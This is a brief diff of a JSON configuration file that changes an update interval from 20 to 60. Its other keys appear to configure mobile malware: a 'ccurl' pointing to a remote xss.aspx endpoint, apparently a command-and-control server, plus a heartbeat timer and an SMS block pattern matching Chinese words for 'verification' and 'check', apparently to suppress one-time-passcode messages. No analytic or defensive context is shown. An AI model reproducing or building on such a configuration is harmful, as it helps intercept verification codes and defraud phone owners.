@@ -1,6 +1,6 @@
 {
 "ccurl":"http://njuj01.w74.mc-test.com/xss.aspx",
-"cfgupdatetime":"20",
+"cfgupdatetime":"60",
 "heartbeat_time":"20",
 "cctel":"",
 "sms_block_pattern":"验证|校验",
